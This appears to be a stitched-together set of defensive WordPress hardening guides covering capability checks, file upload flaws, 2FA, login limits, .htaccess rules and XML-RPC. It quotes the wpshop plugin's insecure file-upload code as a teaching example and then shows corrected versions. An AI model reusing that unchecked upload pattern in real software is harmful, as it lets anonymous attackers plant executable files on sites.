+---+---------------------------------------------------------------------+
| 1 | **if**(current_user_can(\'manage_options\')){ //INCORRECT on        |
|   | multi-site. See below.                                              |
| 2 |                                                                     |
|   |   add_action(\'wp_ajax_your_function\',                             |
| 3 | \'yourClass::yourFunction\');                                       |
|   |                                                                     |
|   | }                                                                   |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

In the above code we check if the user has the 'manage_options'
capability. Only administrators and super admins in WordPress have this
capability.

There is a problem with the above code. If your plugin is installed on
WordPress multi-site, both administrators and super-admins have the
'manage_options' capability. If you are providing a function that only
Administrators can access on single-site WordPress and only Super
Admin's can access on WordPress multi-site, you can change the code to
the following:

+---+--------------------------------------------------------------------+
| 1 | \$hasAccess = false;                                               |
|   |                                                                    |
| 2 | **if**(is_multisite()){                                            |
|   |                                                                    |
| 3 |   **if**(current_user_can(\'manage_network\')){                    |
|   |                                                                    |
| 4 |     \$hasAccess = true;                                            |
|   |                                                                    |
| 5 |   }                                                                |
|   |                                                                    |
| 6 | } **else** {                                                       |
|   |                                                                    |
| 7 |   **if**(current_user_can(\'manage_options\')){                    |
|   |                                                                    |
| 8 |     \$hasAccess = true;                                            |
|   |                                                                    |
| 9 |   }                                                                |
|   |                                                                    |
| 1 | }                                                                  |
| 0 |                                                                    |
|   | **if**(\$hasAccess){                                               |
| 1 |                                                                    |
| 1 |   add_action(\'wp_ajax_your_function\',                            |
|   | \'yourClass::yourFunction\');                                      |
| 1 |                                                                    |
| 2 | }                                                                  |
|   |                                                                    |
| 1 |                                                                    |
| 3 |                                                                    |
+===+====================================================================+
+---+--------------------------------------------------------------------+

To be extra safe, you may want to add these checks into a function
called hasAccess() that you define. Then you should do the check before
you define the privileged action and do the check again inside the
function that performs the privileged operation. While this may not seem
performant, it will protect you if you decide to use the privileged
function elsewhere in the code.

The check we do above checks if the current user can 'manage_network' if
it's a multi-site installation. Only a Super Admin on multi-site can
manage_network. If it's a single-site, it checks if the user can
manage_options, which only Administrators on single-site can do. This
ensures that only Super Admin's on multi-site and Administrators on
single-site can call your privileged function.

Conclusion

Now that you know how to correctly check permissions in your WordPress
plugin or theme, you can create a function in your code that checks
permissions correctly. Then you can liberally sprinkle that function
around your code wherever you perform a privileged operation to ensure
that only users with the correct access level have permission to perform
your privileged operations.

The Impact of File Upload Vulnerabilities

In the video demonstration below we show how a file upload vulnerability
is detected by an attacker on a vulnerable website. The attacker then
uses Metasploit to get a remote shell on the website. We show the
capabilities that a remote shell provides an attacker. The video clearly
demonstrates that file upload vulnerabilities are extremely serious and
very easy to exploit.

 

Types of File Upload Vulnerability

There are two basic kinds of file upload vulnerabilities. We are going
to give these descriptive names in this article that you may not have
heard elsewhere, but we feel these describe the difference between the
basic types of upload vulnerability.

A **local file upload vulnerability** is a vulnerability where an
application allows a user to upload a malicious file directly which is
then executed.

A **remote file upload vulnerability** is a vulnerability where an
application uses user input to fetch a remote file from a site on the
Internet and store it locally. This file is then executed by an
attacker.

Lets look at each of these vulnerabilities in some detail, how they are
created and how to avoid them.

Local File Upload Vulnerability

To examine this vulnerability, lets look at the [['wpshop' plugin file
upload
vulnerability]{.underline}](https://research.g0blin.co.uk/g0blin-00036/) reported
in early 2015. Here is the code that created the vulnerability:

+---+---------------------------------------------------------------------+
| 1 | \$file = \$\_FILES\[\'wpshop_file\'\];                              |
|   |                                                                     |
| 2 | \$tmp_name = \$file\[\'tmp_name\'\];                                |
|   |                                                                     |
| 3 | \$name = \$file\[\"name\"\];                                        |
|   |                                                                     |
| 4 | \@move_uploaded_file(\$tmp_name, WPSHOP_UPLOAD_DIR.\$name);         |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

You can [[find this code at line 620 of includes/ajax.php in version
1.3.9.5 of the
plugin]{.underline}](https://plugins.trac.wordpress.org/browser/wpshop/tags/1.3.9.5/includes/ajax.php#L620).

The code above makes two critical mistakes which create a file upload
vulnerability.

**Mistake 1: **There is no authentication or authorization check to make
sure that the user has signed in (authentication) and has access to
perform a file upload (authorization). This allows an attacker to upload
a file to the website without needing to sign-in or to have the correct
permissions.

As a developer, you can avoid this mistake by verifying the user has
permissions to upload files before processing the file upload:

+---+----------------------------------------------------------------------+
| 1 | **if** (!current_user_can(\'upload_files\')) // Verify the current   |
|   | user can upload files                                                |
| 2 |                                                                      |
|   |     wp_die(\_\_(\'You do not have permission to upload files.\'));   |
| 3 |                                                                      |
|   |                                                                      |
| 4 |                                                                      |
|   | // Process file upload                                               |
+===+======================================================================+
+---+----------------------------------------------------------------------+

**Mistake 2: **There is no sanitization on the file name or contents.
This allows an attacker to upload a file with a .php extension which can
then be accessed by the attacker from the web and executed.

Developers can avoid this mistake by sanitizing the file name so that it
does not contain an extension that can execute code via the web server.
WordPress has some built-in functions to check and sanitize files before
uploading.

wp_check_filetype() will verify the file's extension is allowed to be
uploaded, and, by default, WordPress's list of allowable file uploads
prevents any executable code from being uploaded.

+---+---------------------------------------------------------------------+
| 1 | \$fileInfo =                                                        |
|   | wp_                                                                 |
| 2 | check_filetype(basename(\$\_FILES\[\'wpshop_file\'\]\[\'name\'\])); |
|   |                                                                     |
| 3 | **if** (!empty(\$fileInfo\[\'ext\'\])) {                            |
|   |                                                                     |
| 4 |     // This file is valid                                           |
|   |                                                                     |
| 5 | } **else** {                                                        |
|   |                                                                     |
| 6 |     // Invalid file                                                 |
|   |                                                                     |
|   | }                                                                   |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

You can also further limit what is allowed by specifying the mime types
allowed. This list allows only images.

+---+----------------------------------------------------------------------+
| 1 | // We are only allowing images                                       |
|   |                                                                      |
| 2 | \$allowedMimes = **array**(                                          |
|   |                                                                      |
| 3 |     \'jpg\|jpeg\|jpe\' =\> \'image/jpeg\',                           |
|   |                                                                      |
| 4 |     \'gif\'          =\> \'image/gif\',                              |
|   |                                                                      |
| 5 |     \'png\'          =\> \'image/png\',                              |
|   |                                                                      |
| 6 | );                                                                   |
|   |                                                                      |
| 7 |                                                                      |
|   |                                                                      |
| 8 | \$fileInfo =                                                         |
|   | w                                                                    |
|   | p_check_filetype(basename(\$\_FILES\[\'wpshop_file\'\]\[\'name\'\]), |
|   | \$allowedMimes);                                                     |
+===+======================================================================+
+---+----------------------------------------------------------------------+

Now that we have verified the file name is safe, we'll handle the file
upload itself. WordPress has a handy built-in function to do
this: wp_handle_upload().

+---+---------------------------------------------------------------------+
| 1 | \$fileInfo =                                                        |
|   | wp_                                                                 |
| 2 | check_filetype(basename(\$\_FILES\[\'wpshop_file\'\]\[\'name\'\])); |
|   |                                                                     |
| 3 |                                                                     |
|   |                                                                     |
| 4 | **if** (!empty(\$fileInfo\[\'type\'\])) {                           |
|   |                                                                     |
| 5 |     \$uploadInfo = wp_handle_upload(\$\_FILES\[\'wpshop_file\'\],   |
|   | **array**(                                                          |
| 6 |                                                                     |
|   |         \'test_form\' =\> false,                                    |
| 7 |                                                                     |
|   |         \'mimes\'     =\> \$allowedMimes,                           |
| 8 |                                                                     |
|   |     ));                                                             |
|   |                                                                     |
|   | }                                                                   |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

wp_handle_upload() takes a reference to a single element of
the \$\_FILES super-global and returns an array containing the URL, full
path, and mime type of the upload.

**Check upload content for extra security**

When receiving an upload, you can avoid attackers uploading executable
PHP or other code by examining your uploads for content. For example, if
you are accepting image uploads, call the [[PHP
getimagesize()]{.underline}](https://php.net/manual/en/function.getimagesize.php) function
on the uploaded file to determine if it is a valid image.

getimagesize() attempts to read the header information of the image and
will fail on an invalid image. This is another method to verify the
content you're expecting from the user.

+---+---------------------------------------------------------------------+
| 1 | **if**                                                              |
|   | (!@getimagesize(\$\_FILES\[\'wpshop_file\'\]\[\'tmp_name\'\]))      |
| 2 |                                                                     |
|   |     wp_die(\_\_(\'An invalid image was supplied.\'));               |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

Remote File Upload Vulnerability

A remote file upload vulnerability is when an application does not
accept uploads directly from site visitors. Instead, a visitor can
provide a URL on the web that the application will use to fetch a file.
That file will be saved to disk in a publicly accessible directory. An
attacker may then access that file, execute it and gain access to the
site.

The TimThumb vulnerability which affected a very large number of plugins
and themes was a remote file upload vulnerability. In the case of
TimThumb, the image library provided developers with a way to specify an
image URL in the query string so that TimThumb.php would then fetch that
image from the web.

The image URL could be manipulated so that an attacker could specify a
PHP file which was hosted on the attackers own website. TimThumb would
then fetch that PHP file and store it on the victim website in a
directory accessible from the web. The attacker would then simply access
that PHP file in their browser and be able to execute it.

**How to avoid remote file upload vulnerabilities**

Avoiding this kind of vulnerability is similar to avoiding a local file
upload vulnerability:

-   Only allow specific file extensions.

-   Only allow authorized and authenticated users to use the feature.

-   Check any file fetched from the Web for content. Make sure it is
    actually an image or whatever file type you expect.

-   Serve fetched files from your application rather than directly via
    the web server.

-   Store files in a non-public accessibly directory if you can.

-   Write to the file when you store it to include a header that makes
    it non-executable.

Conclusion

As you can see from the video demonstration and the content above, file
upload vulnerabilities are serious. They are also easily avoided once a
developer can recognize them and there are several effective techniques
available to prevent this kind of vulnerability affecting your WordPress
application.

**2.1 Manage WordPress User Accounts**

Remove Default WP-Admin

A large majority of attacks target the **wp-admin**, **wp-login.php**,
and **xmlrpc.php** access points by using a combination of common
usernames and passwords. By using a unique username and removing the
default admin account in your WordPress installation, you make it much
more difficult for attackers to guess (brute force) their way into your
website.

**Tip**

 

Create a nickname that\'s different from your existing username and set
it as your public display name. This will make it more difficult for
attackers to brute force your login credentials.

User Roles & the Principle of Least Privilege

The [**[principle of least
privilege]{.underline}**](https://blog.sucuri.net/2017/04/the-principle-of-least-privilege.html) is
composed of two very simple steps:

-   Use the minimal set of privileges on a system in order to perform an
    action.

-   Grant privileges only for the exact duration that an action is
    necessary. 

With this concept in mind, WordPress includes built-in roles for
Administrators, Authors, Editors, Contributors, and Subscribers. These
roles specify what can and cannot be accomplished by a user.

Follow these access control recommendations to secure WordPress:

-   Create new user accounts at the lowest level of permission.

-   Grant temporary permissions and revoke access when they are no
    longer needed.

-   Delete accounts that are no longer being used.

-   Ensure that the default user role is set to Subscriber:

    1.  Log into WordPress as an **Administrator**.

    2.  Verify that your Subscriber permissions include only the ability
        to log in and update a profile.

    3.  From the Dashboard, select **Settings \> General**.

    4.  Set the New User Default Role to **Subscriber**.

Every so often a vulnerability within a plugin or theme will surface
which allows for low-level accounts such as subscribers or contributors
to escalate privileges or compromise the website. So, even these
accounts should be kept to minimum permissions for best security
practices.

**2.2 Use Strong Passwords**

WordPress password security is an important factor in hardening your
website and increasing your WP admin security. Password lists are often
used by attackers to brute force WordPress websites. This is why you
should always use strong, unique passwords for all of your accounts to
improve the security of your WP site.

Strong passwords should meet the following standards:

-   At least 1 uppercase character

-   At least 1 lowercase character

-   At least 1 digit

-   At least 1 special character

-   At least 10 characters, (the longer the better) with no more than
    two identical characters in a row

**Note**

 

Using a password generator to generate a randomized string of letters
and numbers is one of the simplest ways to create a secure password.

![](media/image6.png){width="6.8381944444444445in"
height="8.044444444444444in"}

Password Generation Options

**Note**

 

Using a password generator to generate a randomized string of letters
and numbers is one of the simplest ways to create a secure password.

Use Two Factor Identification (2FA) / Multi Factor Identification (MFA)

Two-factor authentication provides a second level of security for your
WordPress account. This feature requires a user to approve a login via
an app and protects your WordPress account in the event that someone is
able to guess your password.

**How to add 2FA to WordPress using Google Authenticator:**

1.  Download and install Google Authenticator on
    your [**[iPhone]{.underline}**](https://itunes.apple.com/us/app/google-authenticator/id388497605?mt=8) or [**[Android]{.underline}**](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en).

2.  Install and activate a 2FA plugin for WordPress
    like [**[miniOrange's
    2FA]{.underline}**](https://wordpress.org/plugins/miniorange-2-factor-authentication/).

3.  Select **miniOrange 2-Factor** from the left menu and follow the
    instructions.

4.  Once you have obtained your QR code, open Google Authenticator and
    click on the Add button on the bottom-right hand side of the
    application.

5.  Scan the QR code displayed by the plugin using your phone's camera.

6.  Verify the code on the plugin page.

**Sucuri's Website Security Platform** includes a feature that helps you
easily password protect or implement 2FA on any page of your website.

To add 2FA to any page on your website using Sucuri:

1.  Download and install Google Authenticator on
    your [**[iPhone]{.underline}**](https://itunes.apple.com/us/app/google-authenticator/id388497605?mt=8) or [**[Android]{.underline}**](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en).

2.  Log into the [**[Sucuri
    Dashboard]{.underline}**](https://dashboard.sucuri.net/login/) and
    navigate to **Website Firewall**.

3.  Click on the website you would like to protect, then select **Access
    Control** from the top navigation.

4.  Enter the page name that you would like to protect (ie.
    /wp-login.php), then select 2FA with Google Auth from the drop-down
    menu.

5.  Click **Protect Page** and scan the QR code with your mobile device
    using Google Authenticator.

![](media/image7.png){width="6.029698162729659in"
height="2.206159230096238in"}

Add 2FA with Sucuri

**2.3 Limit WordPress Login Attempts**

WordPress allows users to attempt a login unlimited times by default,
but this leaves your site vulnerable to brute force attacks as hackers
try to attempt different password combinations.

You can add an extra layer of security by limiting the number of login
attempts against an account through a plugin, or by using a Web
Application Firewall (WAF).

Some popular plugins that provide you with this feature
include Limit [**[Login
Attempts]{.underline}**](https://en-ca.wordpress.org/plugins/limit-login-attempts/), [**[WP
Limit Login
Attempts]{.underline}**](https://en-ca.wordpress.org/plugins/wp-limit-login-attempts/),
and [**[Loginizer]{.underline}**](https://en-ca.wordpress.org/plugins/loginizer/).

**2.4 Use Pre-login CAPTCHAs**

The acronym stands for **Completely Automated Public Turing test to tell
Computers and Humans Apart**. This feature is extremely useful for
stopping automated bots from accessing your WordPress dashboard, as well
as submitting unwanted spam through forms.

Popular plugins that add a CAPTCHA to your WordPress login page
include [**[Captcha]{.underline}**](https://en-ca.wordpress.org/plugins/captcha/) and [**[Really
Simple
Captcha]{.underline}**](https://en-ca.wordpress.org/plugins/really-simple-captcha/).

![A screenshot of a phone Description automatically
generated](media/image8.png){width="4.367361111111111in"
height="1.7354166666666666in"}

Pre-Login Captchas

**2.5 Restrict access to authenticated URLs**

Limiting the access to your WordPress login page to only authorized IP's
will prevent unauthorized entries and better secure your site.

There are plugins available that can do this. If you are using a
cloud-based WAF like the [**[Sucuri
Firewall]{.underline}**](https://sucuri.net/website-firewall/), you can
restrict access to these URL's via your dashboard without having to mess
around with .htaccess files.

If you do everything that we have mentioned thus far, then you are in
pretty good shape.

But as always, there's more that you can do to harden your WordPress
security.

Keep in mind that some of these steps may require coding knowledge.

**Change the Default Admin Username**

In the old days, the default WordPress admin username was 'admin'. Since
usernames make up half of the login credentials, this made it easier for
hackers to do brute-force attacks.

Thankfully, WordPress has since changed this and now requires you to
select a custom username at the time of [[installing
WordPress]{.underline}](https://www.wpbeginner.com/how-to-install-wordpress/).

However, some 1-click WordPress installers still set the default admin
username to 'admin'. If you notice that to be the case, then it's
probably a good idea to [[switch your web
hosting]{.underline}](https://www.wpbeginner.com/beginners-guide/when-should-you-change-your-wordpress-web-hosting-top-7-key-indicators/).

Since WordPress doesn't allow you to change usernames by default, there
are three methods you can use to change the username.

1.  Create a new admin username and delete the old one.

2.  Use the Username Changer plugin

3.  Update username from phpMyAdmin

We have covered all three of these in our detailed guide on [[how to
properly change your WordPress
username]{.underline}](https://www.wpbeginner.com/wp-tutorials/how-to-change-your-wordpress-username/).

**Note:** Just to be clear, we are talking about changing the username
called 'admin', not the [[administrator user
role]{.underline}](https://www.wpbeginner.com/glossary/administrator/),
which is also sometimes called 'admin'.

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Disable File Editing**

WordPress comes with a built-in code editor that allows you to edit your
theme and plugin files right from your WordPress admin area.

In the wrong hands, this feature can be a security risk, which is why we
recommend turning it off.

![Adding custom CSS in a child theme\'s stylesheet in the theme file
editor](media/image9.png){width="6.279207130358706in"
height="2.562489063867017in"}

You can easily do this by adding the following code to
your [[wp-config.php]{.underline}](https://www.wpbeginner.com/beginners-guide/how-to-edit-wp-config-php-file-in-wordpress/) file
or with a code snippet plugin
like [[WPCode]{.underline}](https://wpcode.com) (recommended):

+---+---------------------------------------------------------------------+
| 1 | // Disallow file edit                                               |
|   |                                                                     |
| 2 | define( \'DISALLOW_FILE_EDIT\', true );                             |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

Hosted with ❤️ by [**[WPCode]{.underline}**](https://wpcode.com)

[[1-click Use in
WordPress]{.underline}](https://library.wpcode.com/use-snippet/)

We show you how to do this step by step in our guide on [[how to disable
theme and plugin
editors]{.underline}](https://www.wpbeginner.com/wp-tutorials/how-to-disable-theme-and-plugin-editors-from-wordpress-admin-panel/) from
the WordPress admin panel.

Alternatively, you can do this with 1-click using the Hardening feature
in the free Sucuri plugin mentioned above.

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Disable PHP File Execution in Certain WordPress Directories**

Another way to harden your WordPress security is by disabling PHP file
execution in directories where it's not needed, such
as /wp-content/uploads/.

You can do this by opening a text editor like Notepad and pasting this
code:

+---+---------------------------------------------------------------------+
| 1 | \<Files \*.php\>                                                    |
|   |                                                                     |
| 2 | deny from all                                                       |
|   |                                                                     |
| 3 | \</Files\>                                                          |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

Hosted with ❤️ by [**[WPCode]{.underline}**](https://wpcode.com)

[[1-click Use in
WordPress]{.underline}](https://library.wpcode.com/use-snippet/)

Next, you need to save this file as **.htaccess** and upload it to
the /wp-content/uploads/ folder on your website using an [[FTP
client]{.underline}](https://www.wpbeginner.com/beginners-guide/how-to-use-ftp-to-upload-files-to-wordpress-for-beginners/).

For a more detailed explanation, see our guide on [[how to disable PHP
execution in certain WordPress
directories]{.underline}](https://www.wpbeginner.com/wp-tutorials/how-to-disable-php-execution-in-certain-wordpress-directories/).

Alternatively, you can do this with 1-click using the Hardening feature
in the free Sucuri plugin that we mentioned above.

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Limit Login Attempts**

By default, WordPress allows users to try to log in as many times as
they want. This leaves your WordPress site vulnerable to [[brute-force
attacks]{.underline}](https://www.wpbeginner.com/wp-tutorials/how-to-protect-your-wordpress-site-from-brute-force-attacks-step-by-step/).
This is where hackers try to crack passwords by trying to log in with
different combinations.

This can be easily fixed by limiting the failed login attempts a user
can make. If you are using the web application firewall mentioned
earlier, then this is automatically taken care of.

However, if you don't have the firewall set up, then you can go ahead
using the steps below.

First, you need to install and activate the free [[Limit Login Attempts
Reloaded]{.underline}](https://wordpress.org/plugins/limit-login-attempts-reloaded/) plugin.
For more details, see our step-by-step guide on [[how to install a
WordPress
plugin]{.underline}](https://www.wpbeginner.com/beginners-guide/step-by-step-guide-to-install-a-wordpress-plugin-for-beginners/).

Upon activation, the plugin will start to limit the number of login
attempts users can take.

The default settings will work for most websites, however, you can
customize them by visiting the **Settings » Limit Login Attempts** page
and clicking the 'Settings' tab at the top. For example, to [[comply
with GDPR
laws]{.underline}](https://www.wpbeginner.com/beginners-guide/the-ultimate-guide-to-wordpress-and-gdpr-compliance-everything-you-need-to-know/),
you can click the 'GDPR compliance' checkbox.

![Limit Login Attempts](media/image10.png){width="6.396854768153981in"
height="3.0490343394575676in"}

For detailed instructions, take a look at our guide on [[how and why you
should limit login attempts in
WordPress]{.underline}](https://www.wpbeginner.com/plugins/how-and-why-you-should-limit-login-attempts-in-your-wordpress/).

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Add Two Factor Authentication (2FA)**

The [[two-factor
authentication]{.underline}](https://www.wpbeginner.com/plugins/how-to-add-two-factor-authentication-for-wordpress/) method
requires 2 different steps for users to log in:

1.  The first step is the username and password.

2.  The second step requires you to use a code from a device or app in
    your possession that hackers can't access, such as your smartphone.

Most top online websites like Google, Facebook, and Twitter, allow you
to enable it for your accounts. You can also add the same functionality
to your WordPress site.

First, you need to install and activate the [[WP 2FA -- Two-factor
Authentication]{.underline}](https://wordpress.org/plugins/wp-2fa/) plugin.
For more details, see our step-by-step guide on [[how to install a
WordPress
plugin]{.underline}](https://www.wpbeginner.com/beginners-guide/step-by-step-guide-to-install-a-wordpress-plugin-for-beginners/).

A user-friendly wizard will help you set up the plugin and then you will
be given a QR code.

![Use Your Authenticator App to Scan the QR
Code](media/image11.png){width="6.896854768153981in"
height="3.3842530621172355in"}

You will need to scan the QR code using an authenticator app on your
phone, such as Google Authenticator, Authy, and LastPass Authenticator.

We recommend using [[LastPass
Authenticator]{.underline}](https://www.wpbeginner.com/refer/lastpass/) or [[Authy]{.underline}](https://authy.com/) because
they allow you to back up your accounts to the cloud. This is very
useful in case your phone is lost, reset, or you buy a new phone. All
your account logins will be easily restored.

Most of these apps work in a similar way, and if you are using Authy,
then you simply click the '+' or 'Add account' button in the
authenticator app.

![Click the + Button to Add an
Account](media/image12.png){width="6.985253718285215in"
height="3.9213954505686788in"}

This will let you scan the QR code on your computer using your phone's
camera. You may first need to give the app permission to access the
camera.

After giving the account a name, you can save it.

Next time you log in to your website, you will be asked for the
two-factor authentication code after you enter your password.

![Users Must Enter an Authentication Code Before Logging
In](media/image13.png){width="6.426266404199475in"
height="3.6038145231846017in"}

Simply open the authenticator app on your phone, and you will see a
one-time code.

You can then enter the code on your website to finish logging in.

![Find Your 2FA Token](media/image14.png){width="5.911560586176728in"
height="3.333432852143482in"}

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Change the WordPress Database Prefix**

By default, WordPress uses wp\_ as the prefix for all tables in
your [[WordPress
database]{.underline}](https://www.wpbeginner.com/beginners-guide/beginners-guide-to-wordpress-database-management-with-phpmyadmin/).

If your WordPress site is using the default database prefix, then it
makes it easier for hackers to guess what your table name is. This is
why we recommend changing it.

You can change your database prefix by following our step-by-step
tutorial on [[how to change the WordPress database prefix to improve
security]{.underline}](https://www.wpbeginner.com/wp-tutorials/how-to-change-the-wordpress-database-prefix-to-improve-security/).

**Note:** Changing the database prefix can break your site if it's not
done properly. Only do this if you feel comfortable with your coding
skills.

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Password Protect WordPress Admin and Login Page**

![Password protect WordPress admin
example](media/image15.png){width="6.4703838582677164in"
height="2.882283464566929in"}

Normally, hackers can request your wp-admin folder and login page
without any restrictions. This allows them to try their hacking tricks
or run DDoS attacks.

You can add additional password protection on a server-side level, which
will effectively block those requests.

Just follow our step-by-step instructions on [[how to password-protect
your WordPress admin (wp-admin)
directory]{.underline}](https://www.wpbeginner.com/wp-tutorials/how-to-password-protect-your-wordpress-admin-wp-admin-directory/).

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Disable Directory Indexing and Browsing**

![Directory Browsing](media/image16.png){width="6.029207130358706in"
height="3.399772528433946in"}

When you type the address of one of your website folders into a web
browser, you will be shown the web page called index.html if it exists.
If it doesn't exist, then you will be shown a list of files in that
folder instead. This is known as directory browsing.

Directory browsing can be used by hackers to find out if you have any
files with known vulnerabilities, so they can take advantage of these
files to gain access.

Directory browsing can also be used by other people to look into your
files, copy images, find out your directory structure, and other
information. This is why it is highly recommended that you turn off
directory indexing and browsing.

You need to connect to your website using FTP or your hosting provider's
file manager. Next, locate the .htaccess file in your website's root
directory. If you cannot see it there, then refer to our guide on [[why
you can't see the .htaccess file in
WordPress]{.underline}](https://www.wpbeginner.com/beginners-guide/why-you-cant-find-htaccess-file-on-your-wordpress-site/).

After that, you need to add the following line at the end of the
.htaccess file:

Options -Indexes

Don't forget to save and upload the .htaccess file back to your site.

For more on this topic, see our article on [[how to disable directory
browsing in
WordPress]{.underline}](https://www.wpbeginner.com/wp-tutorials/disable-directory-browsing-wordpress/).

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Disable XML-RPC in WordPress**

XML-RPC is a core WordPress API that helps connect your WordPress site
with web and [[mobile
apps]{.underline}](https://www.wpbeginner.com/showcase/best-mobile-apps-to-manage-your-wordpress-site/).
It has been enabled by default since WordPress 3.5.

However, because of its powerful nature, XML-RPC can significantly
amplify brute-force attacks.

For example, if a hacker traditionally wanted to try 500 different
passwords on your website, then they would have to make 500 separate
login attempts. This can be caught and blocked by the Limit Login
Attempts Reloaded plugin.

But with XML-RPC, a hacker can use the system.multicall function to try
thousands of passwords with say 20 or 50 requests.

This is why if you are not using XML-RPC, then we recommend that you
disable it.

There are 3 ways to disable XML-RPC in WordPress, and we have covered
all of them in our step-by-step tutorial on [[how to disable XML-RPC in
WordPress]{.underline}](https://www.wpbeginner.com/plugins/how-to-disable-xml-rpc-in-wordpress/).

**Tip:** The .htaccess method is the best one because it's the least
resource-intensive. The other methods are easier for beginners.

Alternatively, this is taken care of automatically if you are using a
web application firewall (WAF) as we mentioned earlier.

\[[[Back to Top
↑]{.underline}](https://www.wpbeginner.com/wordpress-security/#contents)\]

**Automatically Log Out Idle Users in WordPress**

Logged-in users can sometimes wander away from the screen, and this
poses a security risk. Someone can hijack their session, change
passwords, or make changes to their account.

This is why many banking and financial sites automatically log out an
inactive user. You can set up similar functionality on your WordPress
site as well.

You will need to install and activate the [[Inactive
Logout]{.underline}](https://wordpress.org/plugins/inactive-logout/) plugin.
Upon activation, visit the **Settings » Inactive Logout** page to
customize the logout settings.

![Logout idle users](media/image17.png){width="5.779207130358706in"
height="2.83582895888014in"}

Simply set the time duration and add a logout message. Then, don't
forget to click on the 'Save Changes' button at the bottom of the page
to store your settings.
